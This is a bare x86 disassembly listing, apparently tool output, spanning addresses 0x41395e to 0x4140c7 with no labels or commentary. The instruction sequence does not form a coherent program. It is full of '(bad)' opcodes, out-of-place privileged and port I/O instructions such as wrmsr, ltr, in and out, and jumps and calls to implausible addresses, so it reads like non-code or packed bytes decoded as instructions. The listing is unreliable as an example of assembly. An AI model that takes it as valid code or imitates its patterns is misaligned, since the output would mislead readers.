  41395e:	adc    DWORD PTR [ecx],esi
  413960:	pop    esi
  413961:	inc    ecx
  413962:	leave  
  413963:	or     DWORD PTR [eax],ebx
  413965:	gs push ebp
  413967:	add    ah,ch
  413969:	into   
  41396a:	in     al,dx
  41396b:	enter  0xb756,0xf0
  41396f:	push   cs
  413970:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  41397a:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  413980:	jnp    0x7441be88
  413986:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  41398c:	add    BYTE PTR [edi],cl
  41398e:	mov    edi,DWORD PTR [ecx-0x78]
  413991:	ltr    WORD PTR [ecx-0x7b]
  413995:	dec    DWORD PTR [edi]
  413997:	clc    
  413998:	out    0x45,eax
  41399a:	add    BYTE PTR [eax],cl
  41399c:	cmp    ebx,0xffffff8c
  41399f:	jge    0x4139a1
  4139a1:	jb     0x4139b3
  4139a3:	je     0x503a23
  4139a9:	pop    edx
  4139aa:	push   esi
  4139ab:	mov    ecx,DWORD PTR [edi]
  4139ad:	in     al,dx
  4139ae:	rol    DWORD PTR [ebp+0x0],1
  4139b1:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  4139b8:	cmp    DWORD PTR [ecx],0xfffffff0
  4139bb:	hlt    
  4139bc:	mov    esp,DWORD PTR [eax+0xf034d2b]
  4139c2:	(bad)  
  4139c4:	push   eax
  4139c5:	jns    0xb8411e43
  4139cb:	lock push cs
  4139cd:	ror    edx,0x3
  4139d0:	test   BYTE PTR [ecx+0x5500e800],cl
  4139d6:	dec    eax
  4139d7:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  4139db:	(bad)  
  4139dc:	mov    esi,0x7f33ff5f
  4139e1:	inc    eax
  4139e2:	test   DWORD PTR [edx],eax
  4139e4:	je     0x4139a6
  4139e6:	mov    ecx,ecx
  4139e8:	adc    DWORD PTR [ebp-0xc],0xffffffec
  4139ec:	and    eax,DWORD PTR [eax+0xf0103]
  4139f2:	jp     0x4139e0
  4139f4:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  4139f8:	add    edx,DWORD PTR [edi+0x74]
  4139fb:	sbb    BYTE PTR [ebp+0x4d001484],cl
  413a01:	add    BYTE PTR [ebp-0x74c48bbb],al
  413a07:	je     0x41398c
  413a09:	cmp    eax,edi
  413a0b:	js     0x413a30
  413a0d:	add    eax,0xeb0fc003
  413a12:	jns    0x41399f
  413a14:	vmread DWORD PTR [ecx+0x45],ebx
  413a18:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  413a1e:	adc    al,0x8b
  413a20:	jge    0x413a36
  413a22:	mov    edi,DWORD PTR [eax-0x4]
  413a25:	add    edi,DWORD PTR [edi]
  413a27:	or     bh,bh
  413a29:	push   ebp
  413a2a:	push   es
  413a2b:	mov    DWORD PTR [ebp-0x4],ebx
  413a2e:	add    edi,esi
  413a30:	pop    es
  413a31:	add    esi,DWORD PTR [edi-0x48ccf183]
  413a37:	mov    DWORD PTR [esp+esi*8],ecx
  413a3a:	inc    ebp
  413a3b:	pop    ebp
  413a3c:	xor    DWORD PTR [esi-0x4],0x3b
  413a40:	add    edx,DWORD PTR [ecx+edi*1]
  413a43:	push   es
  413a44:	clc    
  413a45:	mov    bh,0xdb
  413a47:	jp     0x413a00
  413a49:	add    cl,BYTE PTR [esi]
  413a4b:	div    DWORD PTR [edi+0x4d8b0c1c]
  413a51:	test   edi,edi
  413a53:	je     0x413a49
  413a55:	mov    eax,ecx
  413a57:	or     BYTE PTR [ebx],al
  413a59:	dec    BYTE PTR [ecx+0x7d3bec7d]
  413a5f:	jbe    0x413ad3
  413a61:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  413a67:	add    ecx,DWORD PTR [esi]
  413a69:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  413a6f:	add    eax,DWORD PTR [ebx-0x287af783]
  413a75:	je     0x413ac4
  413a77:	mov    DWORD PTR [ecx],edi
  413a79:	mov    esi,eax
  413a7b:	hlt    
  413a7c:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  413a83:	jb     0x413a45
  413a85:	jmp    0x413a72
  413a87:	xor    esi,DWORD PTR [ebx]
  413a89:	pop    edi
  413a8a:	pop    esi
  413a8b:	pop    ebx
  413a8c:	ret    
  413a8d:	ret    0x8b
  413a90:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  413a96:	xor    DWORD PTR [ecx],0xc
  413a99:	pushf  
  413a9a:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  413aa0:	wrmsr  
  413aa2:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  413aa9:	dec    ebp
  413aaa:	ret    
  413aab:	mov    edi,DWORD PTR [esi-0x4]
  413aae:	pop    eax
  413aaf:	dec    ebp
  413ab0:	jne    0x413a3d
  413ab2:	xor    edi,esp
  413ab4:	inc    eax
  413ab5:	dec    ebp
  413ab6:	jbe    0x413b0b
  413ab8:	inc    eax
  413ab9:	pop    ebp
  413aba:	add    edx,DWORD PTR [esi+0x8]
  413abd:	push   ebp
  413abe:	dec    eax
  413abf:	push   ecx
  413ac0:	mov    eax,edi
  413ac2:	and    al,0xf0
  413ac4:	jo     0x413ab1
  413ac6:	mov    eax,DWORD PTR [ebx]
  413ac8:	sbb    BYTE PTR [ebp+0x4d],cl
  413acb:	mov    eax,DWORD PTR [ebx]
  413acd:	nop
  413ace:	or     BYTE PTR [eax],al
  413ad0:	jne    0x413b29
  413ad2:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  413ad9:	xor    edi,edi
  413adb:	add    edi,DWORD PTR [ebp+0x3]
  413ade:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  413ae4:	js     0x413a6a
  413ae6:	jae    0x413aea
  413ae8:	(bad)  
  413aea:	xor    al,0x5d
  413aec:	jmp    0x413a79
  413aee:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  413af5:	fdecstp 
  413af7:	test   BYTE PTR [edi],ah
  413af9:	add    bh,BYTE PTR [ebp+0x0]
  413afc:	add    ebx,DWORD PTR [ebp-0x77]
  413aff:	mov    edi,eax
  413b01:	cmp    al,0x0
  413b04:	adc    dh,BYTE PTR [ebx]
  413b06:	jge    0x413b0b
  413b08:	mov    edi,DWORD PTR [ebx]
  413b0a:	jl     0x413b1b
  413b0c:	clc    
  413b0d:	dec    edi
  413b0e:	jge    0x413b10
  413b10:	mov    eax,DWORD PTR [ebx]
  413b12:	jb     0x413b1c
  413b14:	mov    ecx,DWORD PTR [ebp-0x8]
  413b17:	mov    edi,edi
  413b19:	xor    edx,DWORD PTR [eax]
  413b1b:	add    edi,DWORD PTR [ebx]
  413b1d:	mov    DWORD PTR [ebp-0x10],edi
  413b20:	inc    edi
  413b21:	pop    ebp
  413b22:	jge    0x413b5f
  413b24:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  413b28:	mov    edx,0xc05d87f0
  413b2d:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  413b31:	fimul  WORD PTR [eax]
  413b33:	fist   WORD PTR [ebp+0x1c]
  413b36:	in     al,dx
  413b37:	jne    0x413b25
  413b39:	mov    edi,DWORD PTR [edx-0x7a27a10]
  413b3f:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  413b43:	fdivp  st(0),st
  413b45:	fild   WORD PTR [ebp+0x4510f85c]
  413b4b:	test   BYTE PTR [ebx+0x4d00fc02],cl
  413b51:	inc    ebp
  413b52:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  413b58:	mov    ebp,DWORD PTR [ebx-0x4]
  413b5b:	adc    al,0x8b
  413b5d:	rcl    DWORD PTR [eax],0x48
  413b60:	mov    esi,0x7080803
  413b65:	fiadd  WORD PTR [ebp+0x4d]
  413b68:	(bad)  
  413b69:	mov    edx,DWORD PTR [edx-0x4]
  413b6c:	mov    edx,DWORD PTR [ebp-0x4]
  413b6f:	xor    ebx,DWORD PTR [ebx+0x330103]
  413b75:	mov    DWORD PTR [edi+0x872dc],edi
  413b7b:	xlat   BYTE PTR ds:[ebx]
  413b7c:	into   
  413b7d:	ffreep st(6)
  413b7f:	retf   0x6c7
  413b82:	iret   
  413b83:	dec    ebp
  413b84:	inc    ebp
  413b85:	mov    DWORD PTR [ebx],edi
  413b87:	fmul   QWORD PTR [edi]
  413b89:	dec    ebp
  413b8a:	jnp    0x413bbf
  413b8c:	add    BYTE PTR [ebx],al
  413b8e:	mov    ecx,DWORD PTR [esp+edi*8]
  413b91:	inc    ebp
  413b92:	dec    ebp
  413b93:	lea    esi,[ebx]
  413b95:	add    DWORD PTR [ebx],eax
  413b97:	jb     0x413bd4
  413b99:	add    BYTE PTR [edi],cl
  413b9b:	inc    ebp
  413b9c:	imul   eax,edi,0x858bd800
  413ba2:	cld    
  413ba3:	clc    
  413ba4:	mov    DWORD PTR [ebp+0x0],eax
  413ba7:	inc    DWORD PTR [eax]
  413ba9:	or     al,0xde
  413bab:	sbb    bh,0x1
  413bae:	retf   
  413baf:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  413bb6:	dec    ebp
  413bb7:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  413bbd:	enter  0x12de,0xdf
  413bc1:	inc    ebp
  413bc2:	pop    ebp
  413bc3:	dec    DWORD PTR [ebx-0x257f0ff4]
  413bc9:	add    DWORD PTR [edx],edx
  413bcb:	add    BYTE PTR [ebp+0x50],dl
  413bce:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  413bd4:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  413bda:	or     ah,al
  413bdc:	pop    ss
  413bdd:	cdq    
  413bde:	push   ebp
  413bdf:	clc    
  413be0:	mov    eax,DWORD PTR [ebp-0x4]
  413be3:	xor    edx,edx
  413be5:	add    esi,DWORD PTR [ebx]
  413be7:	cmp    eax,DWORD PTR [ebx]
  413be9:	hlt    
  413bea:	cmp    DWORD PTR [ebx],esp
  413bec:	or     al,BYTE PTR [ebp+0xf]
  413bef:	mov    eax,DWORD PTR [edx]
  413bf1:	loopne 0x413bf3
  413bf3:	(bad)  
  413bf4:	mov    ecx,esi
  413bf6:	cld    
  413bf7:	pushf  
  413bf8:	pop    ebp
  413bf9:	pushf  
  413bfa:	mov    esi,DWORD PTR [edx]
  413bfc:	lock mov eax,eax
  413bff:	adc    BYTE PTR [ebx],al
  413c01:	or     BYTE PTR [ebx+0x4d001001],0xcf
  413c08:	xor    ebp,DWORD PTR [edi+0x50e45189]
  413c0e:	dec    ebp
  413c0f:	mov    ecx,DWORD PTR [ebx-0x31390304]
  413c15:	(bad)  
  413c16:	iret   
  413c17:	inc    ebp
  413c18:	(bad)  
  413c19:	jne    0x413c68
  413c1b:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  413c21:	(bad)  
  413c22:	cmp    ebx,eax
  413c24:	je     0x413bac
  413c26:	add    edi,edi
  413c28:	or     bh,bh
  413c2a:	dec    ebp
  413c2b:	inc    ebp
  413c2c:	mov    esi,DWORD PTR [ebx]
  413c2e:	cld    
  413c2f:	add    ecx,esi
  413c31:	cmp    ecx,DWORD PTR [eax-0xc]
  413c34:	mov    edx,DWORD PTR [edi]
  413c36:	or     BYTE PTR [ebp-0x7c],al
  413c39:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  413c40:	or     al,0x9c
  413c42:	inc    ebp
  413c43:	xor    bh,BYTE PTR [ecx+ecx*4]
  413c46:	pushf  
  413c47:	call   0x522bd7
  413c4c:	jne    0x413c15
  413c4e:	mov    ebp,esp
  413c50:	fcomp  DWORD PTR [ebx]
  413c52:	add    BYTE PTR [ecx],al
  413c54:	inc    DWORD PTR [ebp-0x75]
  413c57:	(bad)  
  413c58:	cld    
  413c59:	add    al,0xce
  413c5b:	mov    ecx,edi
  413c5d:	cld    
  413c5e:	inc    ebp
  413c5f:	fidivr WORD PTR [ebx]
  413c61:	fbstp  TBYTE PTR [ebp-0x3e]
  413c64:	mov    eax,DWORD PTR [eax]
  413c66:	adc    BYTE PTR [ebx-0x3974038b],cl
  413c6c:	fadd   st,st(7)
  413c6e:	add    BYTE PTR [ebp-0x1],al
  413c71:	mov    ecx,DWORD PTR [esp+edi*8]
  413c74:	inc    ebp
  413c75:	mov    bh,0xc7
  413c78:	loopne 0x413cbf
  413c7a:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  413c80:	sbb    BYTE PTR [ebx],dh
  413c82:	pushf  
  413c83:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  413c89:	mov    eax,edi
  413c8b:	cwde   
  413c8c:	inc    ebp
  413c8d:	inc    ebp
  413c8e:	jne    0x413c1b
  413c90:	mov    esp,esp
  413c92:	clc    
  413c93:	add    al,0x4d
  413c95:	mov    DWORD PTR [ebx],esi
  413c97:	or     al,0x33
  413c99:	inc    ebp
  413c9a:	lea    ecx,[ebx-0x398d13fd]
  413ca0:	add    bh,al
  413ca2:	inc    ebp
  413ca3:	ror    DWORD PTR [ebx+0x45d829],0x8b
  413caa:	add    ebp,esp
  413cac:	shufps xmm1,xmm3,0xc7
  413cb0:	(bad)  
  413cb1:	jmp    0x748677da
  413cb6:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  413cbc:	hlt    
  413cbd:	mov    ecx,DWORD PTR [edi]
  413cbf:	fadd   DWORD PTR [ebp+0x0]
  413cc2:	xor    ecx,DWORD PTR [edi]
  413cc4:	add    ecx,ecx
  413cc6:	cmp    edi,edi
  413cc8:	pmuludq mm7,QWORD PTR [edx+0x50]
  413ccc:	(bad)  
  413ccd:	jmp    0x413c5a
  413ccf:	mov    edi,esp
  413cd1:	or     al,0xc6
  413cd3:	inc    ebp
  413cd4:	(bad)  
  413cd5:	mov    eax,DWORD PTR [ebp+0x10]
  413cd8:	jne    0x413c63
  413cda:	mov    eax,DWORD PTR [ecx]
  413cdc:	clc    
  413cdd:	add    BYTE PTR [ebp-0x40],cl
  413ce0:	xor    edx,DWORD PTR [eax-0x73]
  413ce3:	jne    0x413ce6
  413ce5:	push   DWORD PTR [edx+0x8]
  413ce8:	add    BYTE PTR [ebp+0x45],al
  413ceb:	mov    ebp,ecx
  413ced:	cld    
  413cee:	add    BYTE PTR [ebp+0x0],cl
  413cf1:	xor    eax,DWORD PTR [ebp+0x3]
  413cf4:	mov    DWORD PTR [ebx],edi
  413cf6:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  413cfc:	sub    eax,0x5d330e4d
  413d01:	lea    esi,[ebx]
  413d03:	add    DWORD PTR [ebx],eax
  413d05:	jb     0x413cf0
  413d07:	add    BYTE PTR [eax],al
  413d09:	inc    ebp
  413d0a:	add    bl,ch
  413d0c:	inc    ebp
  413d0d:	mov    esi,DWORD PTR [ebx]
  413d0f:	or     al,0x3
  413d11:	(bad)  
  413d12:	mov    edi,eax
  413d14:	in     al,dx
  413d15:	scas   eax,DWORD PTR es:[edi]
  413d16:	inc    ebp
  413d17:	mov    esi,DWORD PTR [ebx]
  413d19:	in     al,0x3
  413d1b:	add    al,0x89
  413d1d:	mov    ecx,DWORD PTR [eax+edi*8]
  413d20:	dec    ebp
  413d21:	(bad)  
  413d22:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  413d29:	mov    ecx,eax
  413d2b:	cld    
  413d2c:	push   es
  413d2d:	dec    ebp
  413d2e:	add    al,0x33
  413d30:	mov    DWORD PTR [ebx],eax
  413d32:	in     al,dx
  413d33:	cmp    DWORD PTR [ebp-0x67],eax
  413d36:	mov    eax,DWORD PTR [ebp-0xba0068]
  413d3c:	mov    edx,DWORD PTR [ebp-0x4]
  413d3f:	mov    ecx,DWORD PTR [ebp-0x18]
  413d42:	xor    ecx,DWORD PTR [ebp+0x3]
  413d45:	cmp    DWORD PTR [ebx],0x8b32749b
  413d4b:	xor    edi,esp
  413d4d:	jmp    0xff753a9f
  413d52:	add    ecx,DWORD PTR [ebp-0x3f]
  413d55:	xor    ebx,DWORD PTR [edi]
  413d57:	add    eax,ecx
  413d59:	cmp    ebx,DWORD PTR [eax]
  413d5b:	mov    ecx,DWORD PTR [ebp-0x4]
  413d5e:	mov    ecx,DWORD PTR [eax]
  413d60:	adc    BYTE PTR [ebp-0x80],al
  413d63:	jmp    0x413d66
  413d65:	mov    eax,DWORD PTR [eax]
  413d67:	cld    
  413d68:	mov    bh,0xc6
  413d6a:	push   ecx
  413d6b:	(bad)  
  413d6c:	jne    0x413dcc
  413d6e:	dec    ecx
  413d70:	or     BYTE PTR [ecx+ebx*1],cl
  413d73:	push   ebp
  413d74:	inc    ebp
  413d75:	in     al,dx
  413d76:	add    ebp,esp
  413d78:	or     bh,al
  413d7a:	dec    ebp
  413d7b:	cld    
  413d7c:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  413d82:	xor    DWORD PTR [eax],0x2
  413d85:	pushf  
  413d86:	dec    DWORD PTR [ebx+0x45510cf4]
  413d8c:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  413d92:	mov    edx,DWORD PTR [ecx+0xc]
  413d95:	xor    eax,esi
  413d97:	mov    edx,0xc172c7
  413d9c:	inc    ebp
  413d9d:	mov    esi,DWORD PTR [ebp+0x8]
  413da0:	mov    eax,edx
  413da2:	call   0x84c60497
  413da7:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  413dae:	call   0x4db14dbb
  413db3:	push   edi
  413db4:	xor    esi,DWORD PTR [ebp+0x3]
  413db7:	(bad)  
  413db8:	pmulhuw mm0,mm1
  413dbb:	test   DWORD PTR [ebp-0x8],ecx
  413dbe:	mov    DWORD PTR [ebp-0x67],eax
  413dc1:	mov    eax,DWORD PTR [ebp-0x4]
  413dc4:	xor    edi,DWORD PTR [ebp-0x73]
  413dc7:	xor    eax,DWORD PTR [ebx]
  413dc9:	xor    esi,DWORD PTR [edx+0x3]
  413dcc:	add    BYTE PTR [ecx],bh
  413dce:	inc    ebp
  413dcf:	(bad)  
  413dd0:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  413dd6:	mov    DWORD PTR [eax],0x750f0004
  413ddc:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  413de2:	lock add BYTE PTR [ebp+0x0],al
  413de6:	mov    esi,DWORD PTR [ebp-0x2c]
  413de9:	mov    ebp,edx
  413deb:	or     al,0x72
  413ded:	ja     0x413def
  413def:	mov    edx,esi
  413df1:	cld    
  413df2:	(bad)  
  413df5:	cli    
  413df6:	mov    esi,DWORD PTR [ebp-0x4]
  413df9:	cmp    ecx,esi
  413dfb:	bswap  edi
  413dfd:	(bad)
  413e01:	mov    esi,DWORD PTR [ebp-0x4]
  413e04:	mov    esi,ecx
  413e06:	clc    
  413e07:	repnz add esi,DWORD PTR [ebp+0x45]
  413e0b:	push   ebx
  413e0c:	xor    eax,DWORD PTR [ebp+0x3]
  413e0f:	xor    bl,BYTE PTR [edi-0x64]
  413e12:	pop    ebx
  413e13:	jmp    0x413eda
  413e18:	mov    esi,DWORD PTR [ebp-0x7d]
  413e1b:	xor    ebp,DWORD PTR [eax]
  413e1d:	lea    eax,[ebp-0x8]
  413e20:	xor    edx,esi
  413e22:	pushf  
  413e23:	out    dx,eax
  413e24:	(bad)  
  413e25:	neg    eax
  413e27:	ins    DWORD PTR es:[edi],dx
  413e28:	test   esi,edi
  413e2a:	clc    
  413e2b:	pop    esp
  413e2c:	inc    ebp
  413e2d:	or     BYTE PTR [ecx+0x450f0c7d],cl
  413e33:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  413e39:	add    cl,al
  413e3b:	jne    0x413dd9
  413e3d:	mov    esi,DWORD PTR [edx]
  413e3f:	in     al,dx
  413e40:	push   esi
  413e41:	xor    BYTE PTR [ebp-0xe],dh
  413e44:	add    edi,esi
  413e46:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  413e4c:	add    cl,bh
  413e4e:	mov    edi,DWORD PTR [ebp+0x8]
  413e51:	mov    DWORD PTR [ebp-0x14],esi
  413e54:	add    esi,DWORD PTR [ebp+0x3c]
  413e57:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  413e5d:	mov    ah,0x3c
  413e5f:	pushf  
  413e60:	pushf  
  413e61:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  413e67:	jne    0x413df4
  413e69:	mov    ecx,DWORD PTR [esp+ebp*8]
  413e6c:	icebp  
  413e6d:	icebp  
  413e6e:	shl    edx,0xf2
  413e71:	(bad)  
  413e72:	mov    ah,0x16
  413e74:	pop    eax
  413e75:	jne    0x413e0a
  413e77:	mov    ecx,DWORD PTR [edi]
  413e79:	in     al,dx
  413e7a:	jmp    0x413e6d
  413e7c:	add    dl,dh
  413e7e:	mov    edi,esi
  413e80:	or     al,0x8
  413e82:	inc    ebp
  413e83:	jne    0x413e88
  413e85:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  413e8b:	ret    
  413e8c:	or     bh,bh
  413e8e:	jge    0x413e78
  413e90:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  413e96:	xor    edi,eax
  413e98:	add    esi,DWORD PTR [ebp-0x77]
  413e9b:	mov    ebx,esp
  413e9d:	clc    
  413e9e:	neg    DWORD PTR [ebp-0x7c]
  413ea1:	xor    eax,DWORD PTR [eax]
  413ea3:	cmp    eax,DWORD PTR [eax]
  413ea5:	repz jne 0x413e3d
  413ea8:	xor    eax,DWORD PTR [ecx]
  413eaa:	add    ebx,DWORD PTR [eax]
  413eac:	mov    DWORD PTR [ebp-0x8],eax
  413eaf:	mov    eax,edi
  413eb1:	cld    
  413eb2:	lock pop eax
  413eb4:	test   DWORD PTR [ebx],esi
  413eb6:	clc    
  413eb7:	add    edx,DWORD PTR [edi-0x740bff77]
  413ebd:	fdivp  st(4),st
  413ebf:	test   ecx,esi
  413ec1:	(bad)  
  413ec2:	jnp    0x413ec3
  413ec4:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  413eca:	jae    0x413e57
  413ecc:	sub    edi,esp
  413ece:	(bad)  
  413ecf:	shl    DWORD PTR [eax-0x3e],0x89
  413ed3:	leave  
  413ed4:	call   0x8196f5e1
  413ed9:	in     al,dx
  413eda:	(bad)  
  413edb:	in     al,dx
  413edc:	add    bh,al
  413ede:	mov    esp,edi
  413ee0:	in     al,dx
  413ee1:	test   DWORD PTR [ebp-0x8],edi
  413ee4:	mov    eax,DWORD PTR [ebp+0x2b]
  413ee7:	xor    BYTE PTR [ebx],al
  413ee9:	pushf  
  413eea:	jnp    0x57303b23
  413ef0:	xor    edx,DWORD PTR [ebp-0x77]
  413ef3:	push   ecx
  413ef4:	loopne 0x413f29
  413ef6:	jne    0x413eb3
  413ef8:	mov    esi,DWORD PTR [edx-0x20]
  413efb:	add    BYTE PTR [ebp-0x3d],bh
  413efe:	xor    eax,DWORD PTR [ebp-0x73]
  413f01:	mov    edi,DWORD PTR [esi]
  413f03:	cld    
  413f04:	jb     0x413ecc
  413f06:	add    bl,al
  413f08:	jne    0x413f4f
  413f0a:	mov    edx,DWORD PTR [edi-0x10]
  413f0d:	jge    0x413f8c
  413f0f:	mov    esi,DWORD PTR [ebx]
  413f11:	lock add ecx,DWORD PTR [ebp+0x3b]
  413f15:	xor    esi,DWORD PTR [ebp-0x77]
  413f18:	mov    esi,eax
  413f1a:	lock inc ebp
  413f1c:	jge    0x413f4f
  413f1e:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  413f25:	dec    ebp
  413f26:	mov    esi,DWORD PTR [ebx]
  413f28:	loopne 0x413eb3
  413f2a:	jge    0x413f24
  413f2c:	add    DWORD PTR [ebp-0x7d],eax
  413f2f:	icebp  
  413f30:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  413f37:	dec    ebp
  413f38:	hlt    
  413f39:	xor    ebx,DWORD PTR [ebp-0x77]
  413f3c:	mov    esi,esp
  413f3e:	in     al,0x45
  413f40:	jge    0x413f7f
  413f42:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  413f49:	dec    ebp
  413f4a:	pop    esp
  413f4b:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  413f51:	inc    ebp
  413f52:	hlt    
  413f53:	xor    DWORD PTR [ebp-0x61],esi
  413f56:	mov    edi,DWORD PTR [eax+0xf19504]
  413f5c:	repnz mov DWORD PTR [ebp+0x20],ebx
  413f60:	cmp    eax,DWORD PTR [ebp+0xf]
  413f63:	test   DWORD PTR [edi+ecx*1-0x1],edx
  413f67:	fistp  WORD PTR [ebx+0x0]
  413f6a:	inc    ebp
  413f6b:	mov    ebx,DWORD PTR [edi+0xc]
  413f6e:	add    eax,eax
  413f70:	inc    ebp
  413f71:	test   BYTE PTR [ebx],dh
  413f73:	add    eax,DWORD PTR [ebx]
  413f75:	add    BYTE PTR [esi+0x45],bl
  413f78:	ret    0x85
  413f7b:	jnp    0x5441c34a
  413f81:	inc    bp
  413f83:	inc    ebp
  413f84:	xor    DWORD PTR [ecx+0xc78a9c],edi
  413f8a:	fdiv   QWORD PTR [ebx]
  413f8c:	test   DWORD PTR [ecx+0x453bf8],edi
  413f92:	push   ebx
  413f93:	add    edi,DWORD PTR [esi+0x708088b]
  413f99:	cmp    esi,eax
  413f9b:	setl   BYTE PTR [ecx-0x74fcffce]
  413fa2:	mov    esp,edi
  413fa4:	call   0x33cc84f6
  413fa9:	or     BYTE PTR [ebx],al
  413fab:	inc    ecx
  413fac:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  413fb2:	and    BYTE PTR [ebp-0x7074f0bb],al
  413fb8:	lock add cl,al
  413fbb:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  413fc2:	mov    ch,0x45
  413fc4:	clc    
  413fc5:	xor    eax,DWORD PTR [ebp+0x3]
  413fc8:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  413fce:	inc    ebp
  413fcf:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  413fd5:	mov    edi,eax
  413fd7:	mov    eax,DWORD PTR [ebp+0x3c]
  413fda:	mov    ecx,DWORD PTR [eax]
  413fdc:	hlt    
  413fdd:	inc    ebp
  413fde:	ror    DWORD PTR [ebx+0x818c45],0xf4
  413fe5:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  413feb:	push   ebp
  413fec:	mov    edi,DWORD PTR [ebx]
  413fee:	in     al,dx
  413fef:	jne    0x413fb2
  413ff1:	mov    eax,DWORD PTR [ebp-0x28]
  413ff4:	add    DWORD PTR [eax],0xe8058dec
  413ffa:	clc    
  413ffb:	mov    esi,DWORD PTR [edi-0x8]
  413ffe:	add    dh,dl
  414000:	rol    WORD PTR [ebp-0x1],cl
  414004:	mov    edx,DWORD PTR [eax+0x8]
  414007:	jne    0x413fc9
  414009:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  414010:	inc    ebp
  414011:	push   esp
  414012:	test   DWORD PTR [ecx+0xf],ecx
  414015:	sub    edx,esp
  414017:	add    eax,DWORD PTR [eax]
  414019:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  41401f:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  414026:	mov    eax,DWORD PTR [ecx]
  414028:	and    BYTE PTR [eax],al
  41402a:	adc    BYTE PTR ds:[eax],al
  41402d:	inc    ebp
  41402e:	inc    cx
  414031:	push   esp
  414032:	add    al,0x75
  414034:	add    BYTE PTR [edx+0x66],dl
  414037:	enter  0xc1,0x4d
  41403b:	mov    esp,DWORD PTR [esi+0x20]
  41403e:	add    DWORD PTR [ecx-0x7b],eax
  414041:	add    eax,DWORD PTR [ebx]
  414043:	str    WORD PTR [eax+0x45]
  414047:	lea    ecx,[ebx+0x45890801]
  41404d:	sbb    BYTE PTR [ebx],al
  41404f:	dec    ebp
  414050:	cmp    al,0xf
  414052:	inc    ebp
  414053:	push   eax
  414054:	mov    esi,DWORD PTR [ebx]
  414056:	push   eax
  414057:	add    eax,eax
  414059:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  414060:	inc    ebp
  414061:	add    BYTE PTR [ecx],dh
  414063:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  41406a:	(bad)  
  41406b:	mov    ebx,eax
  41406d:	loopne 0x4140b4
  41406f:	dec    ebp
  414070:	mov    ecx,DWORD PTR [edi]
  414072:	cld    
  414073:	push   eax
  414074:	xchg   DWORD PTR [ebx],esi
  414076:	add    DWORD PTR [ebx],ebp
  414078:	add    BYTE PTR [ebx],ch
  41407a:	or     BYTE PTR [ecx],bh
  41407c:	dec    ecx
  41407d:	loopne 0x414082
  41407f:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  414085:	push   ebp
  414086:	add    DWORD PTR [ebx+0x55100800],eax
  41408c:	dec    ebp
  41408d:	jmp    0x414018
  41408f:	mov    esp,DWORD PTR [eax]
  414091:	sbb    dl,dl
  414093:	inc    eax
  414094:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  41409a:	add    BYTE PTR [ebx+0x74528555],cl
  4140a0:	push   ebp
  4140a1:	div    DWORD PTR [ebx]
  4140a3:	and    eax,DWORD PTR [ebx]
  4140a5:	add    edx,DWORD PTR [edx-0x30]
  4140a8:	jno    0x414035
  4140aa:	inc    DWORD PTR [eax+eiz*1]
  4140ad:	inc    ebp
  4140ae:	push   eax
  4140af:	push   eax
  4140b0:	mov    esp,DWORD PTR [edi-0x74beff1c]
  4140b6:	mov    edi,esp
  4140b8:	push   eax
  4140b9:	inc    ebp
  4140ba:	enter  0x458b,0x8
  4140be:	push   ecx
  4140bf:	(bad)  
  4140c0:	call   0x10b4a98
  4140c5:	pop    ss
  4140c6:	push   ebp
  4140c7:	mov    ecx,DWORD PTR [ebx+0x489408]
